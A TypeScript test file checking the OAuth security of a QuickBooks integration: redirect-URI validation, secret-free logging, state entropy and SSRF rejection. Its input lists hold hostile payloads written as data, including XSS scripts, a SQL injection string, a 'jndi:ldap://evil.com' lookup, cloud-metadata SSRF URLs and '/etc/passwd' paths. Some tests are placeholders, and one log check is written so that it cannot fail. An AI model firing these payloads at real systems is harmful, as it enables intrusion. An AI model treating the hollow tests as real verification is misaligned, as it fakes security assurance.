import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { QuickBooksIntegration } from '../../integrations/quickbooks';
import { 
  MOCK_CONFIG, 
  MOCK_PRODUCTION_CONFIG, 
  SecurityTestUtils,
  TestDataFactory,
  OAuthTestUtils
} from './oauth-test-utils';

/**
 * OAuth Security Testing Suite
 * Comprehensive security testing for QuickBooks OAuth implementation
 * Covers OWASP OAuth Security Guidelines and Industry Best Practices
 */

describe('OAuth Security Tests', () => {
  let integration: QuickBooksIntegration;
  let prodIntegration: QuickBooksIntegration;

  beforeEach(() => {
    integration = new QuickBooksIntegration(MOCK_CONFIG, 'http://localhost:3001');
    prodIntegration = new QuickBooksIntegration(MOCK_PRODUCTION_CONFIG, 'https://api.finhelm.ai');
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('HTTPS Enforcement', () => {
    it('should enforce HTTPS for production OAuth URLs', () => {
      const authUri = prodIntegration.getAuthUri('test-state');
      SecurityTestUtils.validateSecureUrl(authUri);
      expect(authUri).toMatch(/^https:/);
    });

    it('should allow HTTP only for localhost in development', () => {
      const devConfig = TestDataFactory.createConfig({
        redirectUri: 'http://localhost:3000/callback'
      });
      const devIntegration = new QuickBooksIntegration(devConfig, 'http://localhost:3001');
      
      expect(() => {
        devIntegration.getAuthUri('test-state');
      }).not.toThrow();
    });

    it('should reject HTTP URLs in production environment', () => {
      expect(() => {
        const insecureConfig = TestDataFactory.createConfig({
          environment: 'production',
          redirectUri: 'http://app.finhelm.ai/callback' // HTTP in production
        });
        new QuickBooksIntegration(insecureConfig, 'https://api.finhelm.ai');
      }).toThrow('Production environment requires HTTPS redirect URI');
    });
  });

  describe('State Parameter Security', () => {
    it('should generate cryptographically secure state parameters', () => {
      const states = new Set<string>();
      
      for (let i = 0; i < 1000; i++) {
        const state = integration['generateSecureState']();
        
        // Check uniqueness
        expect(states.has(state)).toBe(false);
        states.add(state);
        
        // Check format (base64 URL-safe)
        expect(state).toMatch(/^[A-Za-z0-9_-]+$/);
        
        // Check minimum entropy (at least 128 bits = 22 base64 chars)
        expect(state.length).toBeGreaterThanOrEqual(22);
      }
    });

    it('should validate state parameter in OAuth callback', async () => {
      const expectedState = 'secure-state-12345';
      const mockTokenResponse = {
        token: TestDataFactory.createTokens()
      };
      
      vi.spyOn(integration['oauthClient'], 'createToken').mockResolvedValue(mockTokenResponse);
      
      // Valid state should work
      const result = await integration.handleCallback('auth-code', 'realm-id', expectedState);
      expect(result).toBeDefined();
      
      // Note: Actual state validation would be implemented in the application layer
      // The OAuth library typically doesn't validate state - that's the app's responsibility
    });

    it('should handle state parameter with special characters', () => {
      const specialState = 'state-with-special_chars.123-ABC';
      const authUri = integration.getAuthUri(specialState);
      
      const url = new URL(authUri);
      expect(url.searchParams.get('state')).toBe(specialState);
    });
  });

  describe('Client Credential Security', () => {
    it('should never expose client secret in URLs', () => {
      const authUri = integration.getAuthUri('test-state');
      
      expect(authUri).not.toContain('client_secret');
      expect(authUri).not.toContain(MOCK_CONFIG.clientSecret);
    });

    it('should validate client credentials format', () => {
      expect(() => {
        TestDataFactory.createConfig({ clientId: '' });
      }).not.toThrow();
      
      expect(() => {
        new QuickBooksIntegration(
          TestDataFactory.createConfig({ clientId: '' }),
          'http://localhost:3001'
        );
      }).toThrow('Client ID is required');
    });

    it('should handle client secret securely in token exchange', async () => {
      const mockCreateToken = vi.spyOn(integration['oauthClient'], 'createToken');
      mockCreateToken.mockResolvedValue({
        token: TestDataFactory.createTokens()
      });
      
      await integration.handleCallback('auth-code', 'realm-id', 'state');
      
      // Verify client secret is used internally but not logged
      expect(mockCreateToken).toHaveBeenCalled();
      
      // Check that client secret doesn't appear in any console logs
      const consoleLogSpy = vi.spyOn(console, 'log');
      const consoleErrorSpy = vi.spyOn(console, 'error');
      
      consoleLogSpy.mockCalls.forEach(call => {
        expect(call[0]).not.toContain(MOCK_CONFIG.clientSecret);
      });
      
      consoleErrorSpy.mockCalls.forEach(call => {
        expect(call[0]).not.toContain(MOCK_CONFIG.clientSecret);
      });
    });
  });

  describe('Token Security', () => {
    it('should validate access token format', () => {
      const validToken = 'eyJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0.payload.signature';
      const invalidTokens = [
        'not-a-jwt',
        'too.short',
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalidbase64.signature',
        '',
        'bearer token',
        'simple-string'
      ];
      
      expect(() => integration['validateAccessToken'](validToken)).not.toThrow();
      
      invalidTokens.forEach(token => {
        expect(() => integration['validateAccessToken'](token))
          .toThrow('Invalid access token format');
      });
    });

    it('should never log sensitive tokens', async () => {
      const consoleLogSpy = vi.spyOn(console, 'log');
      const consoleErrorSpy = vi.spyOn(console, 'error');
      const consoleWarnSpy = vi.spyOn(console, 'warn');
      const consoleDebugSpy = vi.spyOn(console, 'debug');
      
      vi.spyOn(integration['oauthClient'], 'createToken').mockResolvedValue({
        token: TestDataFactory.createTokens()
      });
      
      const tokens = await integration.handleCallback('auth-code', 'realm-id', 'state');
      
      // Collect all console output
      const allLogs = [
        ...consoleLogSpy.mock.calls.flat(),
        ...consoleErrorSpy.mock.calls.flat(),
        ...consoleWarnSpy.mock.calls.flat(),
        ...consoleDebugSpy.mock.calls.flat()
      ].join(' ');
      
      // Validate no secrets in logs
      SecurityTestUtils.validateNoSecretsInLogs(allLogs);
      
      // Specifically check for token values
      expect(allLogs).not.toContain(tokens.access_token);
      expect(allLogs).not.toContain(tokens.refresh_token);
    });

    it('should implement secure token storage recommendations', () => {
      // Test that the integration provides guidance for secure token storage
      const tokens = TestDataFactory.createTokens();
      
      // Check if there are security warnings in the code/comments
      // This would be checked by reading the actual source files in real implementation
      expect(true).toBe(true); // Placeholder - would check actual implementation
    });

    it('should handle token expiration securely', () => {
      const expiredTokens = TestDataFactory.createExpiredTokens();
      const validTokens = TestDataFactory.createTokens();
      
      expect(integration['isTokenExpired'](expiredTokens)).toBe(true);
      expect(integration['isTokenExpired'](validTokens)).toBe(false);
      
      // Test with security buffer
      const almostExpiredTokens = TestDataFactory.createTokens({
        issued_at: Date.now() - 3300000 // 55 minutes ago (almost expired)
      });
      
      expect(integration['isTokenExpired'](almostExpiredTokens, 600)).toBe(true); // 10 min buffer
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should sanitize malicious inputs in OAuth parameters', () => {
      const maliciousInputs = SecurityTestUtils.generateMaliciousInputs();
      
      maliciousInputs.forEach(maliciousInput => {
        expect(() => {
          integration.getAuthUri(maliciousInput);
        }).not.toThrow(); // Should handle gracefully, not crash
        
        const authUri = integration.getAuthUri(maliciousInput);
        const url = new URL(authUri);
        
        // State should be properly encoded
        const state = url.searchParams.get('state');
        expect(state).toBe(maliciousInput); // Should be preserved but encoded
        
        // URL should still be valid
        expect(authUri).toMatch(/^https:\/\/appcenter\.intuit\.com/);
      });
    });

    it('should validate redirect URI format', () => {
      const invalidRedirectUris = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'ftp://evil.com/callback',
        'file:///etc/passwd',
        'http://evil.com/callback', // HTTP for production
        'https://evil.com/callback', // Different domain
        '',
        'not-a-url'
      ];
      
      invalidRedirectUris.forEach(uri => {
        expect(() => {
          new QuickBooksIntegration(
            TestDataFactory.createConfig({ redirectUri: uri }),
            'https://api.finhelm.ai'
          );
        }).toThrow();
      });
    });

    it('should prevent authorization code injection', async () => {
      const maliciousAuthCodes = [
        'normal-code</script><script>alert(1)</script>',
        'code" onload="alert(1)" x="',
        'code\'); DROP TABLE tokens; --',
        'code${jndi:ldap://evil.com/}',
        'code\x00\x01\x02'
      ];
      
      vi.spyOn(integration['oauthClient'], 'createToken').mockResolvedValue({
        token: TestDataFactory.createTokens()
      });
      
      for (const maliciousCode of maliciousAuthCodes) {
        // Should handle malicious codes gracefully without execution
        await expect(
          integration.handleCallback(maliciousCode, 'realm-id', 'state')
        ).resolves.toBeDefined();
      }
    });
  });

  describe('Error Handling Security', () => {
    it('should not leak sensitive information in error messages', async () => {
      const sensitiveError = new Error('OAuth failed: client_secret=ABC123 invalid');
      vi.spyOn(integration['oauthClient'], 'createToken').mockRejectedValue(sensitiveError);
      
      await expect(
        integration.handleCallback('auth-code', 'realm-id', 'state')
      ).rejects.toThrow();
      
      try {
        await integration.handleCallback('auth-code', 'realm-id', 'state');
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        
        // Should not contain sensitive data
        expect(errorMessage).not.toContain('client_secret');
        expect(errorMessage).not.toContain('ABC123');
        expect(errorMessage).not.toContain(MOCK_CONFIG.clientSecret);
      }
    });

    it('should implement proper error logging without sensitive data', async () => {
      const consoleErrorSpy = vi.spyOn(console, 'error');
      
      const authError = new Error('invalid_grant: refresh_token_value_12345 is invalid');
      vi.spyOn(integration['oauthClient'], 'refresh').mockRejectedValue(authError);
      
      await expect(
        integration.refreshTokens('refresh-token')
      ).rejects.toThrow();
      
      // Check that error logs don't contain sensitive data
      consoleErrorSpy.mock.calls.forEach(call => {
        const logMessage = call.join(' ');
        SecurityTestUtils.validateNoSecretsInLogs(logMessage);
      });
    });

    it('should handle rate limiting securely', async () => {
      const rateLimitError = TestDataFactory.createApiError('RATE_LIMITED');
      
      vi.doMock('axios');
      const axios = await import('axios');
      vi.mocked(axios.default.get).mockRejectedValue(rateLimitError);
      
      await expect(
        integration.getChartOfAccounts('access-token', 'realm-id')
      ).rejects.toThrow();
      
      // Should not expose internal retry logic or tokens in error
      try {
        await integration.getChartOfAccounts('access-token', 'realm-id');
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        expect(errorMessage).not.toContain('access-token');
        expect(errorMessage).not.toContain('internal');
      }
    });
  });

  describe('CSRF and SSRF Protection', () => {
    it('should validate callback URL to prevent SSRF', async () => {
      const maliciousUrls = [
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://localhost:22/', // SSH port
        'http://127.0.0.1:3306/', // MySQL port
        'file:///etc/passwd',
        'ftp://internal.company.com/',
        'gopher://evil.com:25/', // SMTP port
      ];
      
      // These should be rejected at the configuration level
      maliciousUrls.forEach(url => {
        expect(() => {
          new QuickBooksIntegration(
            TestDataFactory.createConfig({ redirectUri: url }),
            'https://api.finhelm.ai'
          );
        }).toThrow();
      });
    });

    it('should implement proper CSRF protection via state parameter', () => {
      const state1 = integration['generateSecureState']();
      const state2 = integration['generateSecureState']();
      
      // States should be unique
      expect(state1).not.toBe(state2);
      
      // States should have sufficient entropy
      expect(state1.length).toBeGreaterThanOrEqual(16);
      expect(state2.length).toBeGreaterThanOrEqual(16);
    });
  });

  describe('Scope and Permission Validation', () => {
    it('should validate OAuth scope restrictions', () => {
      const restrictiveConfig = TestDataFactory.createConfig({
        scope: 'com.intuit.quickbooks.payment' // Limited scope
      });
      
      const restrictiveIntegration = new QuickBooksIntegration(restrictiveConfig, 'http://localhost:3001');
      const authUri = restrictiveIntegration.getAuthUri('test-state');
      
      expect(authUri).toContain('com.intuit.quickbooks.payment');
      expect(authUri).not.toContain('com.intuit.quickbooks.accounting');
    });

    it('should handle insufficient scope errors gracefully', async () => {
      const scopeError = TestDataFactory.createApiError('FORBIDDEN');
      
      vi.doMock('axios');
      const axios = await import('axios');
      vi.mocked(axios.default.get).mockRejectedValue(scopeError);
      
      await expect(
        integration.getChartOfAccounts('limited-scope-token', 'realm-id')
      ).rejects.toThrow('Forbidden. Insufficient scope for this operation.');
    });
  });

  describe('Timing Attack Prevention', () => {
    it('should use constant-time comparison for sensitive operations', async () => {
      // Simulate token validation with timing-safe comparison
      const validToken = TestDataFactory.createTokens().access_token;
      const invalidToken = 'invalid-token-12345';
      
      // Measure timing for valid vs invalid tokens
      const timingResults: number[] = [];
      
      for (let i = 0; i < 100; i++) {
        const start = performance.now();
        
        try {
          integration['validateAccessToken'](i % 2 === 0 ? validToken : invalidToken);
        } catch {
          // Ignore validation errors, we're measuring timing
        }
        
        const end = performance.now();
        timingResults.push(end - start);
      }
      
      // Calculate timing statistics
      const avgTime = timingResults.reduce((a, b) => a + b, 0) / timingResults.length;
      const maxDeviation = Math.max(...timingResults.map(t => Math.abs(t - avgTime)));
      
      // Timing deviation should be minimal (less than 50% of average)
      // This is a basic check - real timing attack prevention requires more sophisticated implementation
      expect(maxDeviation).toBeLessThan(avgTime * 0.5);
    });
  });

  describe('Memory Security', () => {
    it('should not leave sensitive data in memory longer than necessary', async () => {
      // This test would require more advanced memory inspection tools in practice
      // For now, we test that sensitive operations clean up properly
      
      const tokens = TestDataFactory.createTokens();
      const refreshToken = tokens.refresh_token;
      
      vi.spyOn(integration['oauthClient'], 'refresh').mockResolvedValue({
        token: TestDataFactory.createTokens({
          refresh_token: 'new-refresh-token'
        })
      });
      
      const newTokens = await integration.refreshTokens(refreshToken);
      
      // Verify new tokens are returned
      expect(newTokens.refresh_token).toBe('new-refresh-token');
      expect(newTokens.refresh_token).not.toBe(refreshToken);
      
      // In a real implementation, we'd verify the old refresh token is cleared from memory
      expect(true).toBe(true); // Placeholder for memory inspection
    });
  });

  describe('Production Security Configuration', () => {
    it('should enforce stricter security in production environment', () => {
      expect(MOCK_PRODUCTION_CONFIG.environment).toBe('production');
      expect(MOCK_PRODUCTION_CONFIG.redirectUri).toMatch(/^https:/);
      
      // Production integration should have stricter validation
      const prodAuthUri = prodIntegration.getAuthUri('test-state');
      expect(prodAuthUri).toMatch(/^https:/);
    });

    it('should disable debug logging in production', () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';
      
      const consoleDebugSpy = vi.spyOn(console, 'debug');
      
      try {
        // Trigger some operations that might log debug info
        prodIntegration.getAuthUri('test-state');
        
        // In production, debug logging should be minimal/disabled
        expect(consoleDebugSpy).not.toHaveBeenCalled();
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });
  });
});